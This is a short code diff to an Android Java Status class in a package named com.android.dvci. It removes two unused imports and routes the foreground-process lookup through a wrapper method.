@@ -23,14 +23,12 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ConfEvent;
 import com.android.dvci.conf.ConfModule;
 import com.android.dvci.conf.Globals;
-import com.android.dvci.crypto.Crypto;
 import com.android.dvci.crypto.Digest;
 import com.android.dvci.event.BaseEvent;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.gui.ASG;
 import com.android.dvci.module.ModuleCrisis;
 import com.android.dvci.util.Check;
-import com.android.dvci.util.PackageUtils;
 import com.android.mm.M;
 
 import java.util.ArrayList;
@@ -825,7 +823,7 @@ public class Status {
 	}
 
 	public String getForeground() {
-		return runningProcess.getForeground();
+		return runningProcess.getForeground_wrapper();
 	}
 
 	public RunningProcesses getRunningProcess() {
